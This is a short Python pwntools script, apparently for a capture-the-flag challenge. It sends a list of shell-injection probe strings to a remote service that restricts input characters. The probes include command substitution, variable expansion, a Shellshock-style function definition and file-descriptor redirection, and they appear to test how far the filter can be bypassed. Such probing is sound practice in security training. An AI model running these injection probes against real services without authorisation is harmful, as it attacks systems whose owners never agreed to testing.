from pwn import remote, time

# Config

HOST="<IP>" # Change this to the IP of the server
PORT = <PORT> # Change this to the port of the server

# Allowed characters based on regex provided
allowed_chars ='0123456789${}/?" &:><=_()[]'

# Test Payloads - Using only allowed characters
test_payloads = [
    "", # empty input         
    " ",
    "\t",
    "${HOME}",
    "$((1+1))",
    "$(echo 123)",
    "? : /",
    '"$HOME"',
    "12345",
    "a",  # this should be blocked
    "ls",  # likely blocked
    "echo test",
    "() { :; }; echo vulnerable",  # bash function test
    "$(());",
    ">&9",  # file descriptor manipulation
    "?name=value&another=value2",
    "$USER=$_",
    "$$",
]

def main():
    # Connect to the service
    conn = remote(HOST, PORT)
    
    try:
        # Print initial banner
        print("[+] Initial response:")
        print(conn.recv(timeout=2).decode())  

        # Send test payloads ono by one
        for i, payload in enumerate(test_payloads):
            print(f"\n[+] Sending payload {i+1}: {repr(payload)}")
            conn.sendline(payload.encode())
        
            time.sleep(0.5) #small delay to allow server tp process
        
            if response := conn.recv(timeout=2).decode(): # type: ignore
                print("[*] Response:")
                print(response)
            else:
                print("[!] No response received")
    except Exception as e:
        print("[-] Error:", e)
    finally:
        conn.close()
    print("\n[+] Done!")
    
if __name__ == "__main__":
    main()
